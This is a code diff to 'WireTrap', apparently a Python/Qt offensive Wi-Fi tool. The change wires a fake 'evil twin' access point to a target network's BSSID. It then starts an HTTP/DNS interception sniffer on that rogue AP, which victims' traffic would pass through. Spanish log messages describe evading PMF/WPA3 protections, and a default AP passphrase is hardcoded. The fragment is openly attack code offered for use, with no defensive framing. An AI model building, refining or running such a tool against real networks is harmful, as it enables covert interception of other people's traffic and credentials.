@@ -875,16 +875,26 @@ class WireTrap(QMainWindow):
                 channel=self.selected_ap.channel or 6,
                 security=et_security,
                 out_interface=iface_out,
-                wpa_passphrase=wpa_pass or "wiretrap123"
+                wpa_passphrase=wpa_pass or "wiretrap123",
+                target_bssid=self.selected_ap.bssid
             )
-            self.log(f"Usando MAC natural de la antena (Natural Roaming Mode "
-                     f"para evadir protecciones PMF/WPA3)")
+            
+            if self.evil_twin.running:
+                self.log(f"Usando MAC natural de la antena (Natural Roaming Mode "
+                         f"para evadir protecciones PMF/WPA3)")
 
-            actual_ap_iface = getattr(self.evil_twin, "ap_iface", iface_ap)
-            self.sniffer = WireTrapSniffer(actual_ap_iface)
-            self.sniffer.on_data = lambda d: self.bridge.data_captured.emit(d)
-            self.sniffer.start()
-            self.log(f"Módulo de Interceptación HTTP/DNS activo en {actual_ap_iface}")
+                actual_ap_iface = getattr(self.evil_twin, "ap_iface", iface_ap)
+                
+                # Pequeño delay adicional para que dhcp/ap estén asentados para el sniffer
+                import time
+                time.sleep(1.0)
+                
+                self.sniffer = WireTrapSniffer(actual_ap_iface)
+                self.sniffer.on_data = lambda d: self.bridge.data_captured.emit(d)
+                self.sniffer.start()
+                self.log(f"Módulo de Interceptación HTTP/DNS activo en {actual_ap_iface}")
+            else:
+                self.log("[!] Abortando inicio del sniffer porque falló AP falso.")
 
             self.et_table.setRowCount(0)
             self.et_group.setStyleSheet(
